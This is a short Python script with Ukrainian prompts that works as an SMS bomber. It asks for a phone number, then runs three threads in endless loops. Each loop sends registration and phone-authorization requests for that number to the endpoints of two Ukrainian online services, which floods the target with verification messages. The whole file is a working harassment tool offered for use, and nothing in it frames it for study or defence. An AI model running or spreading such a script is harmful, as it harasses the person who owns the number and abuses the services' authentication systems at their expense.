import requests
from threading import Thread

number = input('   Формат: 095000001\nВведіть номер телефона > ')
def func(number):
    while True:
        requests.post('https://anc.ua/authorization/auth/v2/register',json={'login': f'+38{number}'}, timeout=30)
        requests.post('https://api.sezamfood.com.ua/ru/request/auth-phone', data = {'agree': 1,'phone': f'38{number}'}, timeout=30)
th = Thread(target=func, args=(number,)).start()
th2 = Thread(target=func, args=(number,)).start()
th3 = Thread(target=func, args=(number,)).start()
